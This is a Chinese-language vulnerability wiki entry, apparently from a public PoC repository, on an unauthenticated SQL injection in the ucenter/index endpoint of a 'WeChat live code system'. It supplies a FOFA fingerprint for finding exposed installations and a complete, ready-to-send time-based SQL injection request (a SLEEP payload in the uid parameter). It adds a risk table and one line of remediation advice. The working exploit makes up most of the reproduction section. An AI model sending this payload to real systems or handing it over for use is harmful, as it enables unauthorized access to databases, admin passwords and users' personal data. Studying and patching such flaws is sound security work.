---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 微信活码系统 ucenterindex SQL注入漏洞

# 漏洞描述

微信活码系统  ucenter/index 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

微信活码系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body=".qn-user-login"

POC/EXP：延时5秒执行2次

GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(5)))RkHL)%20AND%20(1015=1015 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

![image-20241121170435161](./.resource/微信活码系统ucenterindexSQL注入漏洞/media/image-20241121170435161.png)


POC/EXP：延时3秒执行2次

![image-20241121170524752](./.resource/微信活码系统ucenterindexSQL注入漏洞/media/image-20241121170524752.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
